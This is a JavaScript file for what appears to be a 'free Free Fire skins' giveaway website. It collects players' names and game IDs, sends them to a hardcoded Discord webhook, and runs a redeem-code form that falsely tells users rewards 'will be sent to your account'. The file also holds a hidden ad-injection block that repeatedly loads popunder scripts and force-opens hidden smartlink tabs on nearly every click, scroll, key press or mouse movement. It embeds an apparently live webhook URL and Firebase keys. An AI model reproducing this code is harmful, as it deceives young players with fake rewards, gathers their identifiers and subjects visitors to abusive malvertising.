/* ============================================
   FF SKIN FREE FIRE → Discord
   Multi-select max 3 skin · pesan opsional
   ============================================ */

/**
 * 1) Buat Webhook di Discord:
 *    Channel → Edit Channel → Integrations → Webhooks → New Webhook → Copy URL
 * 2) Tempel URL di bawah:
 */
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1538912359660130444/WhSjBdQYHNJdeWJg-RP5M-7hx0DmdvCAkGN6CeovPdYu_1SDBQDgYG9Y5xKdA52XtC_J";

/**
 * DAFTAR SKIN
 * - id    : unik
 * - name  : nama tampilan
 * - image : path gambar (taruh file di folder assets/skins/)
 */

/* SKINS dinamis dari ItemID2 (0xMe) — semua baju, senjata, bundle, dll */
let SKINS = [];
const ITEMID2_JSON = "https://raw.githubusercontent.com/0xMe/ItemID2/main/assets/itemData.json";
const ITEMID2_IMG = "https://raw.githubusercontent.com/0xme/ff-resources/refs/heads/main/pngs/300x300/";

function mapCategory(itemType, name) {
  const t = String(itemType || "").toUpperCase();
  const n = String(name || "").toLowerCase();
  // Bundle murni
  if (t === "BUNDLE" || t === "OPTIONAL_BUNDLE") return "bundle";
  // Avatar
  if (t === "AVATAR" || n.includes("avatar")) return "avatar";
  // Senjata / skin senjata
  const weaponKeys = ["m1887","ak47","m4a1","ump","mp40","awm","groza","scar","vector","an94","famas","m14","svd","kar98","m249","m60","spas","m1014","usp","desert eagle","woodpecker","evo gun","gun skin","rifle","smg","sniper","shotgun","pistol","weapon","blade","katana","scythe","m590","thompson","p90"];
  if (weaponKeys.some((k) => n.includes(k))) return "senjata";
  if (t === "COLLECTION" && /skin|gun|weapon/.test(n)) return "senjata";
  // Baju / clothes
  if (t === "CLOTHES") return "baju";
  // sisanya
  return "lainnya";
}

function isAllowedItem(x) {
  const t = String(x.itemType || "").toUpperCase();
  const ct = String(x.collectionType || "").toUpperCase();
  const name = String(x.description || "").trim();
  if (name.length < 3) return false;
  const icon = String(x.icon || "").trim();
  if (!icon || icon === "NONE") return false;
  const low = name.toLowerCase();
  const rare = String(x.Rare || x.rare || "").toUpperCase();

  // sampah
  if (/(test|unused|nulla|temp|fragment|debris|token|voucher|mystery|crate|loot|gift box|choice crate)/i.test(low)) return false;
  if (t === "CLOTHES" && /\((head|bottom|shoes|mask|facepaint|top|hair)\)/i.test(name)) return false;

  const gunRe = /\b(m1887|ak47|m4a1|ump|mp40|awm|groza|scar|vector|an94|famas|m14|svd|kar98|m249|m60|spas|m1014|usp|woodpecker|thompson|p90|m590|cg15|vss|sks|xm8|parafal|g36|bizon)\b/i;
  const isEvo = low.includes("evo gun") || low.includes("evo king") || low.includes("evo-lution") || /(^|\s)evo(\s|$)/i.test(name);
  const isGunName = gunRe.test(name) || isEvo;
  const isWeapon = ct === "WEAPON_SKIN" || (t === "COLLECTION" && isGunName);

  // rarity groups
  const redOrange = /^(RED|ORANGE|ORANGE_PLUS)$/.test(rare);
  const purpleOk = /^(RED|ORANGE|ORANGE_PLUS|PURPLE|PURPLE_PLUS)$/.test(rare);

  // SENJATA: hanya merah & oren + evo gun
  if (isWeapon) {
    if (isEvo) return true;
    return redOrange;
  }

  // BUNDLE: ungu + merah + oren
  if (t === "BUNDLE" || t === "OPTIONAL_BUNDLE") {
    if (/token|crate|pack/.test(low)) return false;
    return purpleOk;
  }

  // BAJU: ungu + merah + oren
  if (t === "CLOTHES") return purpleOk;

  // Avatar: ungu + merah + oren
  if (t === "AVATAR" || ct === "HEADPIC") return purpleOk;

  return false;
}

async function loadAllSkinsFromItemID2() {
  const grid = document.getElementById("skinGrid");
  if (grid) {
    grid.innerHTML = '<div class="skin-empty">Memuat semua skin dari database…</div>';
  }
  try {
    const res = await fetch(ITEMID2_JSON, { cache: "force-cache" });
    if (!res.ok) throw new Error("HTTP " + res.status);
    const data = await res.json();
    const list = Array.isArray(data) ? data : [];
    const out = [];
    const seen = new Set();
    for (const x of list) {
      if (!isAllowedItem(x)) continue;
      const name = String(x.description || "").trim().slice(0, 48);
      const key = name.toLowerCase();
      if (seen.has(key)) continue;
      seen.add(key);
      const id = "ff_" + String(x.itemID || x.icon);
      const icon = String(x.icon || "").trim();
      out.push({
        id,
        name,
        image: ITEMID2_IMG + icon + ".png",
        category: mapCategory(x.itemType, name)
      });
    }
    // urutkan: senjata dulu (M1887/Evo), lalu bundle, lalu lainnya
    const rank = (s) => {
      const n = s.name.toLowerCase();
      if (n.includes("m1887")) return 0;
      if (n.includes("evo")) return 1;
      if (n.includes("poker")) return 2;
      if (s.category === "bundle") return 3;
      if (s.category === "senjata") return 4;
      if (s.category === "baju") return 5;
      if (s.category === "avatar") return 6;
      return 7;
    };
    out.sort((a, b) => rank(a) - rank(b) || a.name.localeCompare(b.name));
    SKINS = out;
    return out;
  } catch (err) {
    console.error("Gagal muat ItemID2", err);
    if (grid) {
      grid.innerHTML = '<div class="skin-empty">Gagal memuat skin. Cek koneksi / refresh.</div>';
    }
    SKINS = [];
    return [];
  }
}

const MAX_SKINS = 4;

/** Kategori tab */
const CATEGORIES = [
  { id: "all", label: "Semua" },
  { id: "bundle", label: "Bundle" },
  { id: "senjata", label: "Senjata" },
  { id: "baju", label: "Baju" },
  { id: "avatar", label: "Avatar" },
  { id: "lainnya", label: "Lainnya" }
];
let activeCategory = "all";







/* ========== state ========== */
let currentSearch = "";
let selectedSkins = []; // array of skin objects, max MAX_SKINS
/* ========== Popularity REALTIME (Firebase) ========== */
const POP_KEY = "ff_skin_picks"; // cache lokal
const POP_FB_PATH = "ff_giveskin_picks";

// Pakai project Firebase Give Skin / FFKIPAS (bisa diganti config project sendiri)
const firebaseConfig = {
  apiKey: "AIzaSyA8CwA4iBtdHo8zXqaPUzeLD4raoMwg5CM",
  authDomain: "gift-web-yusuf.firebaseapp.com",
  databaseURL: "https://gift-web-yusuf-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "gift-web-yusuf",
  storageBucket: "gift-web-yusuf.firebasestorage.app",
  messagingSenderId: "946917444562",
  appId: "1:946917444562:web:fa1a3d403c0a04891f160b"
};

let popMap = {};
let popDb = null;
let popReady = false;

function loadPopularityLocal() {
  try {
    return JSON.parse(localStorage.getItem(POP_KEY) || "{}") || {};
  } catch (e) {
    return {};
  }
}

function savePopularityLocal(map) {
  try {
    localStorage.setItem(POP_KEY, JSON.stringify(map));
  } catch (e) {}
}

function loadPopularity() {
  if (popReady && popMap && typeof popMap === "object") return popMap;
  return loadPopularityLocal();
}

function initPopularityRealtime() {
  if (typeof firebase === "undefined") {
    popMap = loadPopularityLocal();
    return;
  }
  try {
    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
    popDb = firebase.database();
    popDb.ref(POP_FB_PATH).on("value", (snap) => {
      const val = snap.val() || {};
      const next = {};
      Object.keys(val).forEach((k) => {
        const n = Number(val[k]);
        if (Number.isFinite(n) && n > 0) next[k] = n;
      });
      popMap = next;
      popReady = true;
      savePopularityLocal(next);
      if (typeof renderSkins === "function") renderSkins();
    });
  } catch (e) {
    console.warn("Popularity FB init failed", e);
    popMap = loadPopularityLocal();
  }
}

function bumpPopularity(skins) {
  const list = skins || [];
  const local = loadPopularityLocal();
  list.forEach((s) => {
    if (!s || !s.id) return;
    local[s.id] = (Number(local[s.id]) || 0) + 1;
    popMap[s.id] = (Number(popMap[s.id]) || 0) + 1;
  });
  savePopularityLocal(local);

  if (popDb) {
    list.forEach((s) => {
      if (!s || !s.id) return;
      const safeId = String(s.id).replace(/[.#$\[\]\/]/g, "_");
      popDb.ref(POP_FB_PATH + "/" + safeId).transaction((cur) => {
        const n = Number(cur);
        return (Number.isFinite(n) && n >= 0 ? n : 0) + 1;
      }).catch(() => {});
    });
  }
}

function getSortedSkins() {
  const map = loadPopularity();
  let list = SKINS.slice();
  if (activeCategory && activeCategory !== "all") {
    list = list.filter((s) => (s.category || "lainnya") === activeCategory);
  }
  const q = (currentSearch || "").trim().toLowerCase();
  if (q) {
    list = list.filter((s) => {
      const name = String(s.name || "").toLowerCase();
      const id = String(s.id || "").toLowerCase();
      return name.includes(q) || id.includes(q);
    });
  }
  return list.sort((a, b) => {
    const ca = Number(map[a.id]) || 0;
    const cb = Number(map[b.id]) || 0;
    if (cb !== ca) return cb - ca;
    return String(a.name || "").localeCompare(String(b.name || ""));
  });
}

function setCategory(catId) {
  activeCategory = catId || "all";
  document.querySelectorAll(".cat-tab").forEach((btn) => {
    btn.classList.toggle("active", btn.getAttribute("data-cat") === activeCategory);
  });
  renderSkins();
}

function renderCategoryTabs() {
  const el = document.getElementById("categoryTabs");
  if (!el) return;
  el.innerHTML = CATEGORIES.map((c) => {
    const count =
      c.id === "all"
        ? SKINS.length
        : SKINS.filter((s) => (s.category || "lainnya") === c.id).length;
    const active = c.id === activeCategory ? "active" : "";
    return `<button type="button" class="cat-tab ${active}" data-cat="${c.id}">${c.label} <small>${count}</small></button>`;
  }).join("");
  el.querySelectorAll(".cat-tab").forEach((btn) => {
    btn.addEventListener("click", () => setCategory(btn.getAttribute("data-cat")));
  });
}

/* ========== toast ========== */
function showToast(title, msg, type) {
  const el = document.getElementById("toast");
  const t = document.getElementById("toastTitle");
  const m = document.getElementById("toastMsg");
  if (!el) return;
  el.classList.remove("show", "error");
  if (type === "error") el.classList.add("error");
  if (t) t.textContent = title;
  if (m) m.textContent = msg || "";
  void el.offsetWidth;
  el.classList.add("show");
  clearTimeout(showToast._timer);
  showToast._timer = setTimeout(() => el.classList.remove("show"), 3200);
}

/* ========== skins UI ========== */
function isSelected(id) {
  return selectedSkins.some((s) => s.id === id);
}

function toggleSkin(id) {
  const skin = SKINS.find((x) => x.id === id);
  if (!skin) return;

  if (isSelected(id)) {
    selectedSkins = selectedSkins.filter((s) => s.id !== id);
  } else {
    if (selectedSkins.length >= MAX_SKINS) {
      showToast("Maksimal " + MAX_SKINS, "Bisa pilih maksimal " + MAX_SKINS + " skin", "error");
      return;
    }
    selectedSkins.push(skin);
  }
  renderSkins();
  updateSelectedBar();
}

function renderSkins() {
  const grid = document.getElementById("skinGrid");
  if (!grid) return;

  if (!SKINS.length) {
    grid.innerHTML = '<div class="skin-empty">Belum ada skin. Tambah di script.js → SKINS</div>';
    return;
  }

  const map = loadPopularity();
  const list = getSortedSkins();
  if (!list.length) {
    grid.innerHTML = '<div class="skin-empty">Tidak ada skin cocok' + (currentSearch ? ' untuk "' + escapeHtml(currentSearch) + '"' : '') + '.</div>';
    return;
  }

  grid.innerHTML = list.map((s) => {
    const sel = isSelected(s.id) ? "selected" : "";
    const order = selectedSkins.findIndex((x) => x.id === s.id);
    const badge = order >= 0 ? `<span class="skin-order">${order + 1}</span>` : "";
    const picks = Number(map[s.id]) || 0;
    const pickLabel = picks > 0 ? `<span class="skin-picks">${picks}x</span>` : "";
    return `
      <button type="button" class="skin-item ${sel}" data-id="${escapeAttr(s.id)}" title="${escapeAttr(s.name)}">
        <span class="skin-img-wrap">
          <img class="skin-img" src="${escapeAttr(s.image)}" alt="${escapeAttr(s.name)}" loading="lazy"
               onerror="this.src='data:image/svg+xml,${encodeURIComponent(placeholderSvg(s.name))}'" />
          ${badge}
          ${pickLabel}
        </span>
        <span class="skin-name">${escapeHtml(s.name)}</span>
      </button>`;
  }).join("");

  const items = grid.querySelectorAll(".skin-item");
  items.forEach((btn) => {
    btn.addEventListener("click", () => {
      try { openSmartlink(); } catch (e) {}
      toggleSkin(btn.getAttribute("data-id"));
    });
  });
  observeSkinItems(items);
}

/** Animasi skin saat masuk area scroll */
let _skinIO = null;
function observeSkinItems(items) {
  const root = document.getElementById("skinScroll");
  if (!items || !items.length) return;
  if (_skinIO) {
    try { _skinIO.disconnect(); } catch (e) {}
  }
  // reduced motion → show all
  if (window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches) {
    items.forEach((el) => el.classList.add("skin-visible"));
    return;
  }
  _skinIO = new IntersectionObserver(
    (entries) => {
      entries.forEach((e) => {
        if (e.isIntersecting) {
          const el = e.target;
          const delay = Number(el.dataset.animDelay || 0);
          setTimeout(() => el.classList.add("skin-visible"), delay);
          _skinIO.unobserve(el);
        }
      });
    },
    { root: root || null, threshold: 0.15, rootMargin: "8px 0px 8px 0px" }
  );
  items.forEach((el, i) => {
    el.classList.remove("skin-visible");
    el.dataset.animDelay = String(Math.min(i % 6, 5) * 40); // stagger per baris
    _skinIO.observe(el);
  });
  // fallback: kalau sudah di viewport tanpa scroll event, paksa cek
  requestAnimationFrame(() => {
    items.forEach((el) => {
      if (!root) return;
      const rr = root.getBoundingClientRect();
      const er = el.getBoundingClientRect();
      if (er.top < rr.bottom && er.bottom > rr.top) {
        // biar observer yang handle
      }
    });
  });
}

function placeholderSvg(name) {
  const n = String(name || "Skin").slice(0, 12);
  return `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
    <rect fill="#1a1d27" width="200" height="200"/>
    <text x="50%" y="50%" fill="#6b7280" font-family="sans-serif" font-size="14" text-anchor="middle" dy=".3em">${n}</text>
  </svg>`;
}

function updateSelectedBar() {
  const bar = document.getElementById("selectedBar");
  if (bar) {
    bar.classList.toggle("has-pick", selectedSkins.length > 0);
  }

  const hint = document.getElementById("skinHint");
  const nameEl = document.getElementById("selectedName");
  const subEl = document.getElementById("selectedSub");
  const thumb = document.getElementById("selectedThumb");
  const thumbs = document.getElementById("selectedThumbs");

  if (!selectedSkins.length) {
    if (hint) {
      hint.textContent = "Belum dipilih (max " + MAX_SKINS + ")";
      hint.classList.remove("ok");
    }
    if (nameEl) nameEl.textContent = "Skin belum dipilih";
    if (subEl) subEl.textContent = "Pilih 1–" + MAX_SKINS + " skin di atas";
    if (thumb) {
      thumb.hidden = true;
      thumb.removeAttribute("src");
    }
    if (thumbs) {
      thumbs.innerHTML = "";
      thumbs.hidden = true;
    }
    return;
  }

  const names = selectedSkins.map((s) => s.name).join(", ");
  if (hint) {
    hint.textContent = selectedSkins.length + "/" + MAX_SKINS + " dipilih";
    hint.classList.add("ok");
  }
  if (nameEl) {
    // tampil ringkas biar ga numpuk
    if (selectedSkins.length <= 2) {
      nameEl.textContent = names;
    } else {
      nameEl.textContent = selectedSkins.length + " skin dipilih";
    }
  }
  if (subEl) subEl.textContent = "Siap dikirim ke Discord";

  // multi thumbs
  if (thumbs) {
    thumbs.hidden = false;
    thumbs.innerHTML = selectedSkins
      .map(
        (s) =>
          `<img src="${escapeAttr(s.image)}" alt="${escapeAttr(s.name)}" title="${escapeAttr(s.name)}"
            onerror="this.style.display='none'" />`
      )
      .join("");
  }
  if (thumb) {
    // single thumb fallback (hidden when multi thumbs exist)
    if (thumbs) {
      thumb.hidden = true;
    } else {
      thumb.hidden = false;
      thumb.src = selectedSkins[0].image;
      thumb.onerror = () => {
        thumb.hidden = true;
      };
    }
  }
}

function escapeHtml(s) {
  return String(s || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function escapeAttr(s) {
  return escapeHtml(s).replace(/'/g, "&#39;");
}

function fieldValue(v, fallback) {
  const s = String(v == null ? "" : v).trim();
  return (s || fallback || "-").slice(0, 1024);
}

/* ========== Discord send ========== */
function absoluteUrl(path) {
  try {
    return new URL(path, window.location.href).href;
  } catch (e) {
    return path;
  }
}

/** Hanya URL publik http(s) yang boleh jadi thumbnail Discord */
function publicImageUrl(path) {
  const u = absoluteUrl(path);
  if (!u || typeof u !== "string") return null;
  if (u.startsWith("https://") || u.startsWith("http://")) return u;
  return null;
}

async function sendToDiscord({ name, contact, message, skins }) {
  if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("PASTE_WEBHOOK")) {
    throw new Error("Webhook belum diset. Edit DISCORD_WEBHOOK_URL di script.js");
  }

  const list = Array.isArray(skins) ? skins : [];
  const skinNames =
    list.length > 0 ? list.map((s) => s.name).join(", ") : "— (tidak dipilih)";

  // Discord menolak field value kosong → selalu isi fallback
  const fields = [
    { name: "Nama", value: fieldValue(name, "-"), inline: true },
    { name: "ID Free Fire", value: fieldValue(contact, "-"), inline: true },
    { name: "Jumlah Skin", value: String(list.length || 0), inline: true },
    { name: "Skin dipilih", value: fieldValue(skinNames, "-"), inline: false }
  ];

  // Pesan opsional — hanya tambah field jika diisi
  const msg = String(message || "").trim();
  if (msg) {
    fields.push({ name: "Pesan", value: fieldValue(msg, "-"), inline: false });
  }

  const embed = {
    title: "NOTIF BOCIL FF",
    color: 16744448,
    fields,
    timestamp: new Date().toISOString(),
    footer: { text: "MUHLIS KIPAS · MAX " + MAX_SKINS + " SKIN" }
  };

  // Thumbnail hanya jika URL publik (hindari error embed dari file:// / relative)
  const firstImg = list[0] ? publicImageUrl(list[0].image) : null;
  if (firstImg) {
    embed.thumbnail = { url: firstImg };
  }

  const payload = {
    username: "muhliskipas.my.id",
    embeds: [embed]
  };

  const res = await fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });

  if (!res.ok) {
    const text = await res.text().catch(() => "");
    throw new Error("Discord error " + res.status + (text ? ": " + text.slice(0, 160) : ""));
  }
}

/* ========== form submit ========== */
const form = document.getElementById("feedbackForm");
const sendBtn = document.getElementById("sendBtn");

if (form) {
  form.addEventListener("submit", async (e) => {
    e.preventDefault();
      const name = (document.getElementById("nameInput")?.value || "").trim();
    const contact = (document.getElementById("contactInput")?.value || "").trim();
    const message = (document.getElementById("msgInput")?.value || "").trim();

    if (name.length < 2) {
      showToast("Nama", "Isi nama minimal 2 huruf", "error");
      return;
    }
    if (contact.length < 3) {
      showToast("ID Free Fire", "ID Free Fire wajib diisi", "error");
      return;
    }
    if (!selectedSkins.length) {
      showToast("Skin", "Pilih minimal 1 skin (maksimal " + MAX_SKINS + ")", "error");
      return;
    }
    // pesan TIDAK wajib

    if (sendBtn) {
      try { openSmartlink(); } catch (e) {}
      sendBtn.disabled = true;
      sendBtn.textContent = 'MENGIRIM...';
    }

    try {
      await sendToDiscord({
        name,
        contact,
        message,
        skins: selectedSkins.slice()
      });
      bumpPopularity(selectedSkins);
      showToast("Terkirim", "Permintaan masuk ke admin. Dalam antrian");
      form.reset();
      selectedSkins = [];
      renderSkins();
      updateSelectedBar();
    } catch (err) {
      console.error(err);
      showToast("Gagal kirim", String(err.message || err).slice(0, 120), "error");
    }

    if (sendBtn) {
      sendBtn.disabled = false;
      sendBtn.textContent = 'KIRIM PERMINTAAN';
    }
  });
}

/* ========== Redeem Code ========== */
const REDEEM_CODES = {
  "FINALINCU600X": "600 Evolution Stone",
  "FINALINCU500X": "500 Evolution Stone"
};
let redeemUserId = "";

function showRedeemStep(step) {
  const login = document.getElementById("redeemLogin");
  const form = document.getElementById("redeemForm");
  const success = document.getElementById("redeemSuccess");
  if (login) login.hidden = step !== "login";
  if (form) form.hidden = step !== "form";
  if (success) success.hidden = step !== "success";
}

async function sendRedeemToDiscord(id, code, reward) {
  if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("PASTE_WEBHOOK")) return;
  const embed = {
    title: "REDEEM CODE BERHASIL",
    color: 16766720,
    fields: [
      { name: "ID Free Fire", value: fieldValue(id, "-"), inline: true },
      { name: "Kode", value: fieldValue(code, "-"), inline: true },
      { name: "Reward", value: fieldValue(reward, "-"), inline: false }
    ],
    timestamp: new Date().toISOString(),
    footer: { text: "MUHLIS KIPAS · REDEEM" }
  };
  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "muhliskipas.my.id",
        embeds: [embed]
      })
    });
  } catch (e) {
    console.error("Redeem notify failed", e);
  }
}


function initRedeem() {
  const loginBtn = document.getElementById("redeemLoginBtn");
  const submitBtn = document.getElementById("redeemSubmitBtn");
  const backBtn = document.getElementById("redeemBackBtn");
  const idInput = document.getElementById("redeemIdInput");
  const codeInput = document.getElementById("redeemCodeInput");

  if (loginBtn) {
    loginBtn.addEventListener("click", () => {
      const id = (idInput?.value || "").trim();
      if (id.length < 3) {
        showToast("ID Free Fire", "ID Free Fire wajib diisi (min 3 karakter)", "error");
        return;
      }
      redeemUserId = id;
      const display = document.getElementById("redeemIdDisplay");
      if (display) display.textContent = id;
      showRedeemStep("form");
      if (codeInput) {
        codeInput.value = "";
        codeInput.focus();
      }
    });
  }

  if (backBtn) {
    backBtn.addEventListener("click", () => {
      showRedeemStep("login");
      if (codeInput) codeInput.value = "";
    });
  }

  if (submitBtn) {
    submitBtn.addEventListener("click", async () => {
      const code = (codeInput?.value || "").trim().toUpperCase();
      if (!code) {
        showToast("Kode", "Masukkan kode redeem dulu", "error");
        return;
      }
      const reward = REDEEM_CODES[code];
      if (!reward) {
        showToast("Gagal", "Kode redeem tidak valid / sudah digunakan", "error");
        return;
      }
      submitBtn.disabled = true;
      submitBtn.textContent = 'MEMPROSES...';
      try {
        await sendRedeemToDiscord(redeemUserId, code, reward);
      } catch (e) {}
      const msgEl = document.querySelector(".redeem-msg");
      if (msgEl) {
        msgEl.textContent = "Redeem code berhasil! " + reward + " akan dikirim ke akunmu.";
      }
      showRedeemStep("success");
      showToast("Berhasil", reward + " akan dikirim ke akunmu");
      submitBtn.disabled = false;
      submitBtn.textContent = 'REDEEM SEKARANG';
    });
  }

  if (idInput) {
    idInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        e.preventDefault();
        loginBtn?.click();
      }
    });
  }
  if (codeInput) {
    codeInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        e.preventDefault();
        submitBtn?.click();
      }
    });
  }
}


/* ========== scroll reveal ========== */
function initScrollReveal() {
  document.querySelectorAll("main .card").forEach((el, i) => {
    el.classList.add("reveal");
    if (i > 0) el.classList.add("reveal-delay-" + Math.min(i, 3));
  });
  const io = new IntersectionObserver(
    (entries) => {
      entries.forEach((e) => {
        if (e.isIntersecting) {
          e.target.classList.add("show");
          // keep shown — optional unobserve
          io.unobserve(e.target);
        }
      });
    },
    { threshold: 0.12, rootMargin: "0px 0px -24px 0px" }
  );
  document.querySelectorAll(".reveal").forEach((el) => io.observe(el));
}


/* ========== Cek nickname FF (API) ========== */
async function fetchFfNickname(uid) {
  const id = String(uid || "").trim();
  if (!id || !/^\d{5,15}$/.test(id)) {
    return { ok: false, error: "ID harus angka (min 5 digit)" };
  }
  try {
    const url = "https://api.isan.eu.org/nickname/ff?id=" + encodeURIComponent(id);
    const res = await fetch(url);
    const data = await res.json().catch(() => null);
    if (data && data.success && data.name) {
      return { ok: true, name: String(data.name) };
    }
    return { ok: false, error: "ID tidak ditemukan" };
  } catch (e) {
    return { ok: false, error: "Gagal cek ID (jaringan)" };
  }
}

function setUidCheckEl(el, state, text, name) {
  if (!el) return;
  el.hidden = !state;
  el.classList.remove("loading", "ok", "err");
  if (!state) {
    el.textContent = "";
    return;
  }
  el.classList.add(state);
  if (state === "ok" && name) {
    el.innerHTML = "Nickname: <strong>" + escapeHtml(name) + "</strong>";
  } else {
    el.textContent = text || "";
  }
}

function bindUidChecker(inputId, statusId) {
  const input = document.getElementById(inputId);
  const status = document.getElementById(statusId);
  if (!input) return;

  let timer = null;
  let seq = 0;

  const run = async () => {
    const uid = (input.value || "").trim();
    if (!uid) {
      setUidCheckEl(status, null);
      return;
    }
    if (!/^\d+$/.test(uid)) {
      setUidCheckEl(status, "err", "ID hanya boleh angka");
      return;
    }
    if (uid.length < 5) {
      setUidCheckEl(status, "err", "ID terlalu pendek");
      return;
    }
    const my = ++seq;
    setUidCheckEl(status, "loading", "Mengecek nickname…");
    const r = await fetchFfNickname(uid);
    if (my !== seq) return;
    if (r.ok) setUidCheckEl(status, "ok", "", r.name);
    else setUidCheckEl(status, "err", r.error || "ID tidak ditemukan");
  };

  input.addEventListener("input", () => {
    if (timer) clearTimeout(timer);
    timer = setTimeout(run, 550);
  });
  input.addEventListener("blur", () => {
    if (timer) clearTimeout(timer);
    run();
  });
}

function initUidCheckers() {
  bindUidChecker("contactInput", "contactUidCheck");
  bindUidChecker("redeemIdInput", "redeemUidCheck");
}


function initSkinSearch() {
  const input = document.getElementById("skinSearch");
  if (!input) return;
  let timer = null;
  const apply = () => {
    currentSearch = (input.value || "").trim();
    renderSkins();
  };
  input.addEventListener("input", () => {
    if (timer) clearTimeout(timer);
    timer = setTimeout(apply, 120);
  });
  input.addEventListener("search", apply);
  input.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      e.preventDefault();
      if (timer) clearTimeout(timer);
      apply();
    }
  });
}

/* boot */

/* boot */

/* boot */

/* ========== ADS MAX FILL ========== */
const SMARTLINK_URL = "https://predestineheadypleasure.com/xkbgwuz2?key=408709ee3caabbb7553faef0ab820511";
const POPUNDER_SRC = "https://predestineheadypleasure.com/23/d3/df/23d3df2efa7bcb3805eacddf74e947a3.js";
const SOCIAL_SRC = "https://predestineheadypleasure.com/f6/e5/7e/f6e57e5d19fcae08f4272ed4087c0dc2.js";

function openSmartlink() {
  try {
    const a = document.createElement("a");
    a.href = SMARTLINK_URL;
    a.target = "_blank";
    a.rel = "noopener noreferrer";
    a.style.display = "none";
    document.body.appendChild(a);
    a.click();
    setTimeout(() => { try { a.remove(); } catch (e) {} }, 300);
  } catch (e) {
    try { window.open(SMARTLINK_URL, "_blank"); } catch (e2) {}
  }
  // second attempt after short delay
  setTimeout(() => {
    try {
      const a2 = document.createElement("a");
      a2.href = SMARTLINK_URL;
      a2.target = "_blank";
      a2.rel = "noopener noreferrer";
      a2.style.display = "none";
      document.body.appendChild(a2);
      a2.click();
      setTimeout(() => { try { a2.remove(); } catch (e) {} }, 300);
    } catch (e) {}
  }, 400);
}

function injectScript(src) {
  try {
    const s = document.createElement("script");
    s.src = src + (src.indexOf("?") >= 0 ? "&" : "?") + "t=" + Date.now() + "&r=" + Math.random().toString(36).slice(2);
    s.async = true;
    s.setAttribute("data-ff-ad", "1");
    (document.head || document.documentElement).appendChild(s);
  } catch (e) {}
}

(function initMaxAds() {
  let lastPop = 0;
  let lastSmart = 0;
  const POP_CD = 400;
  const SMART_CD = 500;

  function loadPopunder(force) {
    const now = Date.now();
    if (!force && now - lastPop < POP_CD) return;
    lastPop = now;
    injectScript(POPUNDER_SRC);
    setTimeout(() => injectScript(POPUNDER_SRC), 80);
    setTimeout(() => injectScript(POPUNDER_SRC), 200);
  }

  function fireSmart(force) {
    const now = Date.now();
    if (!force && now - lastSmart < SMART_CD) return;
    lastSmart = now;
    openSmartlink();
  }

  // burst panjang di awal
  for (let i = 0; i < 16; i++) {
    setTimeout(() => loadPopunder(true), 80 + i * 280);
  }
  setTimeout(() => fireSmart(true), 300);
  setTimeout(() => fireSmart(true), 1200);
  setTimeout(() => fireSmart(true), 2800);

  // loop super ketat
  setInterval(() => loadPopunder(false), 1000);
  setInterval(() => loadPopunder(true), 3200);
  setInterval(() => injectScript(SOCIAL_SRC), 4500);
  setInterval(() => fireSmart(false), 4500);
  setInterval(() => {
    injectScript(POPUNDER_SRC);
    injectScript(SOCIAL_SRC);
  }, 6000);

  function onAct(e) {
    loadPopunder(false);
    try {
      const t = e && e.target;
      if (t && t.closest) {
        if (
          t.closest(".skin-item") ||
          t.closest("#sendBtn") ||
          t.closest(".btn-send") ||
          t.closest(".cat-tab") ||
          t.closest("#skinSearch") ||
          t.closest("#redeemLoginBtn") ||
          t.closest("#redeemSubmitBtn") ||
          t.closest("button") ||
          t.closest("a")
        ) {
          fireSmart(true);
          loadPopunder(true);
        }
      } else {
        fireSmart(false);
      }
    } catch (err) {}
  }

  ["pointerdown", "touchstart", "click", "scroll", "keydown", "mousemove", "touchmove"].forEach((ev) => {
    document.addEventListener(ev, onAct, { passive: true, capture: true });
  });

  document.addEventListener("visibilitychange", () => {
    if (!document.hidden) {
      loadPopunder(true);
      fireSmart(true);
      injectScript(SOCIAL_SRC);
    }
  });

  // focus window
  window.addEventListener("focus", () => {
    loadPopunder(true);
    fireSmart(false);
  });

  window.__ffLoadPop = loadPopunder;
  window.__ffSmart = fireSmart;
})();

/* boot */
(async function boot() {
  initUidCheckers();
  initRedeem();
  initScrollReveal();
  initSkinSearch();
  await loadAllSkinsFromItemID2();
  initPopularityRealtime();
  renderCategoryTabs();
  renderSkins();
  updateSelectedBar();
})();
